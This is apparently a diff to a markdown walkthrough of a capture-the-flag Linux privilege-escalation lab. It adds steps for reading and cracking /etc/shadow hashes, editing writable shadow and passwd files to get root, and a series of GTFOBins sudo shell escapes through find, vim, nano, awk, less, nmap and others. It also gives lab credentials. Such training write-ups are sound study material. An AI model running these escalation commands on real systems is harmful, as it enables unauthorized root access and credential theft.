@@ -13,7 +13,7 @@
 No answer needed
 ```
 
-Let's gather some information about our target with nmap. The "initial" output file under the "nmap" folder shows the following:
+Let's gather some information about our target with nmap. The `initial` output file under the `nmap` folder shows the following:
 ```
 # Nmap 7.92 scan initiated Thu Jun  2 09:00:07 2022 as: nmap -sC -sV -oN nmap/initial 10.10.76.64
 Nmap scan report for 10.10.76.64
@@ -58,9 +58,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 The credentials we will be using to connect via SSH are:
 
-Username: ```user```
+Username: `user`
 <br />
-Password: ```password321```
+Password: `password321`
 
 <br />
 
@@ -70,7 +70,7 @@ ssh USERNAME@TARGET_IP
 ```
 ![image](https://user-images.githubusercontent.com/14150485/171621390-963177a3-7270-4187-b137-3db5283d1817.png)
 
-The solution I found over at [AskUbuntu](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss) is to simply add the *-oHostKeyAlgorithms=+ssh-dss* option:
+The solution I found over at [AskUbuntu](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss) is to simply add the `-oHostKeyAlgorithms=+ssh-dss` option:
 ```
 ssh -o HostKeyAlgorithms=ssh-dss USERNAME@TARGET_IP
 ```
@@ -97,7 +97,7 @@ uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),3
 
 ## 2. Service Exploits
 
-This section might be a little advanced for some - It involves compiling the [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) exploit, which is already downloaded as ```raptor_udf2.c``` under the ```/home/user/tools/mysql-udf``` directory on the target machine. This exploit allows us to take advantage of User Defined Functions (UDFs) to run system commands with root privileges using the MySQL service.
+This section might be a little advanced for some - It involves compiling the [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) exploit, which is already downloaded as `raptor_udf2.c` under the `/home/user/tools/mysql-udf` directory on the target machine. This exploit allows us to take advantage of User Defined Functions (UDFs) to run system commands with root privileges using the MySQL service.
 
 <br />
 
@@ -114,19 +114,398 @@ No answer needed
 ## 3. Weak File Permissions - Readable /etc/shadow
 	
 ### 3.1: What is the root user's password hash?
+
+<br />
+
+Checking the contents of the `shadow` file we can apparently see the hash for `root` and `user`.
+```
+cat /etc/shadow
 ```
 
+![image](https://user-images.githubusercontent.com/14150485/172003402-065807d6-2eaf-4937-b5b1-565797b6767a.png)
+
+The answer is:
+
 ```
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
+```
+
 <br />
 
 ### 3.2: What hashing algorithm was used to produce the root user's password hash?
+
+<br />
+
+Before we proceed with the next steps, we should ideally save the hash in a file locally.
+<br />
+
+There are multiple ways we can use to analyze the hash. We can either do it locally using `hashid`:
+```
+hashid hash.txt
 ```
 
+![image](https://user-images.githubusercontent.com/14150485/172004011-49172bd5-9a81-4ac2-b079-7875cc231322.png)
+
+<br />
+
+Or, we can check the hash online at https://hashes.com/en/tools/hash_identifier:
+
+![image](https://user-images.githubusercontent.com/14150485/172004046-62de3684-7ebd-445e-a760-768a5613e7f4.png)
+
+Or, let John The Ripper analyze it for us while cracking it at the same time using the command provided on this task:
+
 ```
+john --wordlist=/usr/share/wordlists/rockyou.txt FILENAME
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172003660-85deec4a-bccf-4726-becd-362ca8af9391.png)
+
+Regardless of the approach to this solution, it looks like we are dealing with a type `sha512crypt` hash.
+```
+sha512crypt
+```
+
 <br />
 
 ### 3.3: What is the root user's password?
+
+<br />
+
+Cracking the hash using John The Ripper reveals the password:
+```
+password123
 ```
 
+We can now switch to `root` using the `su` command and password we just cracked:
 ```
+su root
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172005295-f5fb5d9d-0c4a-447d-82be-a97b0e443825.png)
+
+<br />
+<br />
+
+## 4. Weak File Permissions - Writable /etc/shadow
+
+### 4.1: Read and follow along with the above.
+
+<br />
+
+This task is detailing the ease of editing writable `shadow` files to take advantage of passwords we can generate on our own using the `mkpasswd` command:
+```
+mkpasswd -m sha-512 PASSWORD_HERE
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172007026-bc474a3f-7da7-46bd-a94e-6266076606f5.png)
+
+We can now edit the `shadow` file and paste the generated hash between the first and second colons.
+```
+nano /etc/shadow
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172007071-fc8ee104-118f-47c4-8d3c-326a8db4bdba.png)
+
+To test the new password we simply save the file and ```exit``` from root back to user level.
+```
+su root
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172006968-bd15e1cc-c571-46db-934a-7c09d226698c.png)
+
+
+```
+No answer needed
+```
+
+Remember to exit out of the root shell before continuing!
+
+<br />
+<br />
+
+## 5. Weak File Permissions - Writable /etc/passwd
+
+### 5.1: Run the "id" command as the newroot user. What is the result?
+
+<br />
+
+Similar to the previous task, we can generate our own hashes that we can then use to manipulate writable `passwd` files to our advantage!
+```
+openssl passwd PASSWORD_HERE
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172007767-48fd86a8-0836-4535-a7be-f9b1be8b52da.png)
+
+We can now edit the `passwd` file, replacing the `x` between the first and second colons with the output from the previous command.
+```
+nano /etc/passwd
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172007868-8344ae40-9007-4882-b8db-4a83e4b0eee6.png)
+
+Saving the file and using the new credentials gives us root access to the machine again!
+
+![image](https://user-images.githubusercontent.com/14150485/172007988-e014be78-d440-410d-9661-e327c2865bb9.png)
+
+The `id` command releavs the answer to this task:
+
+![image](https://user-images.githubusercontent.com/14150485/172008103-20231761-f5ba-42b2-8cba-98f95f060550.png)
+
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+<br />
+<br />
+
+## 6. Sudo - Shell Escape Sequences
+
+### 6.1: How many programs is "user" allowed to run via sudo?
+```
+sudo -l
+```
+
+![image](https://user-images.githubusercontent.com/14150485/172009026-907e0e17-e4f3-4203-9cba-c8c9081bc767.png)
+
+```
+11
+```
+
+### 6.2: One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?
+
+<br />
+
+Searching through the list of programs we just got using the `sudo -l` command over at https://gtfobins.github.io, there is only one not appearing on the list.
+```
+apache2
+```
+
+### 6.3: Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.
+
+<br />
+
+Apart from `apache2`, the rest can be used in one way or another for privilege escalation purposes on this machine.
+<br />
+I will be listing `sudo` examples for each exploit below - More detailed information can be found at https://gtfobins.github.io, which is also the source I used for these notes.
+
+Remember to exit back after each root escalation before attempting another exploit!
+
+<br />
+
+**iftop**
+---------
+
+<br />
+
+*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+`sudo iftop`
+<br />
+`/bin/sh`
+
+The `sudo iftop` command launches the application. The `!` character will then enable user input that we can use to execute the `/bin/sh/` command within it:
+
+![image](https://user-images.githubusercontent.com/14150485/172015777-41a49b0e-3ac5-44b8-a968-baad37f402b2.png)
+
+This will grant root access to the machine!
+
+![image](https://user-images.githubusercontent.com/14150485/172013044-6373b96c-10c0-468e-ac85-605b1c551990.png)
+
+<br />
+
+**find**
+--------
+
+<br />
+
+*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+`sudo find . -exec /bin/sh \; -quit`
+
+![image](https://user-images.githubusercontent.com/14150485/172013238-7a66d7ba-f032-49f9-a4ad-11a31378b90d.png)
+
+<br />
+
+**nano**
+--------
+
+<br />
+
+*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+`sudo nano`
+<br />
+`^R^X` - `^R` in this case being `Ctrl + R`, which enables a dialog box in the application, and `^X` being `Ctrl + X` that enables command execution.
+<br />
+`reset; sh 1>&0 2>&0`
+
+![image](https://user-images.githubusercontent.com/14150485/172014033-8ed77c1d-c3e8-40d8-9051-d6c116811d85.png)
+
+After executing the command, any user input is not displayed in nano which can make it a little hard for us to see what it really does, however the above steps do grant root access to the target. We can confirm this by cleaning the active window using the `clear` command and then checking the active user using `whoami`.
+
+![image](https://user-images.githubusercontent.com/14150485/172014113-282340b7-894c-47b5-b796-758ee6beb9f2.png)
+
+<br />
+
+**vim**
+-------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+*(a) ```sudo vim -c ':!/bin/sh'```*
+
+*(b) This requires that vim is compiled with Python support. Prepend :py3 for Python 3.*
+<br />
+*```sudo vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```*
+
+*(c) This requires that vim is compiled with Lua support.*
+<br />
+*```sudo vim -c ':lua os.execute("reset; exec sh")'```*
+
+<br />
+
+The line used in example (a) seems to run successfully:
+
+![image](https://user-images.githubusercontent.com/14150485/172015286-a65b7835-d9d9-4733-8554-845b915f2adb.png)
+
+
+
+
+**man**
+-------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+`sudo man man`
+<br />
+`!/bin/sh`
+
+![image](https://user-images.githubusercontent.com/14150485/172016119-72b9ebb8-61dc-4ef2-b38b-05e7ea6e35a9.png)
+
+Once again, the exploit grants root access to the machine.
+
+![image](https://user-images.githubusercontent.com/14150485/172016189-387d4b96-cde9-4895-825b-e2ab0aa8949f.png)
+
+<br />
+
+**awk**
+-------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+```sudo awk 'BEGIN {system("/bin/sh")}'```
+
+![image](https://user-images.githubusercontent.com/14150485/172016444-46b9f785-5351-4a2f-9e14-76fbcceadba7.png)
+
+<br />
+
+**less**
+--------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+```sudo less /etc/profile```
+<br />
+```!/bin/sh```
+
+![image](https://user-images.githubusercontent.com/14150485/172016574-7fdc2c82-e035-4cca-8e0c-ffde770343f9.png)
+
+The `!` character enables code execution which allows us to run the `/bin/sh` command that grants root access.
+
+![image](https://user-images.githubusercontent.com/14150485/172016591-667f9643-cb9a-4983-ac32-fee3989cd201.png)
+
+<br />
+
+**ftp**
+-------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+```sudo ftp```
+<br />
+```!/bin/sh```
+
+![image](https://user-images.githubusercontent.com/14150485/172016751-ac465d2c-d464-4e31-bbd3-b29bdf3d3012.png)
+
+<br />
+
+**nmap**
+--------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+*(a) Input echo is disabled.*
+<br />
+`TF=$(mktemp)`
+<br />
+`echo 'os.execute("/bin/sh")' > $TF`
+<br />
+`sudo nmap --script=$TF`
+<br />
+
+*(b) The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+<br />
+`sudo nmap --interactive`
+<br />
+`nmap> !sh`
+
+<br />
+
+Following the steps in example (a): 
+
+![image](https://user-images.githubusercontent.com/14150485/172017005-1501a070-dbb1-46b8-a773-c7d29c8d90ee.png)
+
+And example (b):
+
+![image](https://user-images.githubusercontent.com/14150485/172017064-ba72bda4-e546-429a-9f47-2f9dd08e829a.png)
+
+<br />
+
+**more**
+------
+
+<br />
+
+*If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
+
+```TERM= sudo more /etc/profile```
+<br />
+```!/bin/sh```
+
+![image](https://user-images.githubusercontent.com/14150485/172017159-7e447b85-e637-499f-bd3c-f6e1e22668af.png)
+
+Successfully escalated to root!
+
+![image](https://user-images.githubusercontent.com/14150485/172017178-17bcd1aa-41dc-40d2-981d-fd65a24f3a76.png)
+
+<br />
+
+```
+No answer needed
+```
+
+<br />
+<br />
+
+## 7. Sudo - Environment Variables
+
+### 7.1: Read and follow along with the above.
+```
+No answer needed
+```
+
+<br />
 <br />
